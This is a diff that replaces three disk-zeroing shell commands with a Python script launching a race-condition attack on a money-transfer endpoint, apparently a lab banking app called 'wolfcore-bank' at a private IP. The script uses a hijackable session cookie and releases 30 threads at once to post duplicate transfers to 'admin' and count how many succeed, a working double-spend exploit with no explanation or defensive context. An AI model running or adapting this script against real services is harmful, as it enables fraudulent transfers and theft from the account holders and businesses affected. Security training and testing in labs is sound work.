@@ -1,3 +1,83 @@
-sudo dd if=/dev/zero of=/zerofile bs=1M
-sudo sync
-sudo rm -f /zerofile
+import requests
+import threading
+import time
+
+# ========================
+# Configuration
+# ========================
+URL = "http://192.168.64.6/wolfcore-bank/transfer.php"
+SESSION_ID = "ne3n4s56ih8u75udu5om3v1vab"  # Replace with your PHPSESSID
+THREAD_COUNT = 30
+TRANSFER_AMOUNT = "90"
+RECIPIENT = "admin"
+
+# ========================
+# Setup session
+# ========================
+session = requests.Session()
+session.cookies.set("PHPSESSID", SESSION_ID)
+
+payload = {
+    "to_username": RECIPIENT,
+    "amount": TRANSFER_AMOUNT
+}
+
+results = []
+start_event = threading.Event()
+
+
+def send_request(thread_id):
+    start_event.wait()  # wait until all threads are ready
+
+    try:
+        start_time = time.time()
+        response = session.post(URL, data=payload, timeout=10)
+        elapsed = time.time() - start_time
+
+        success = "successful" in response.text.lower()
+
+        results.append({
+            "thread": thread_id,
+            "status": response.status_code,
+            "time": round(elapsed, 3),
+            "success": success
+        })
+
+        print(f"[Thread {thread_id}] Status: {response.status_code} | "
+              f"Time: {elapsed:.3f}s | Success: {success}")
+
+    except Exception as e:
+        print(f"[Thread {thread_id}] ERROR: {e}")
+
+
+# ========================
+# Create threads
+# ========================
+threads = []
+
+for i in range(THREAD_COUNT):
+    t = threading.Thread(target=send_request, args=(i,))
+    threads.append(t)
+    t.start()
+
+time.sleep(1)  # give threads time to initialize
+
+print("\nLaunching race attack...\n")
+start_event.set()  # release all threads at once
+
+for t in threads:
+    t.join()
+
+# ========================
+# Summary
+# ========================
+print("\n" + "=" * 50)
+print("Race Complete")
+print("=" * 50)
+
+total = len(results)
+successful = sum(1 for r in results if r["success"])
+
+print(f"Total Requests Sent: {total}")
+print(f"Successful Transfers: {successful}")
+print(f"Failed Transfers: {total - successful}")
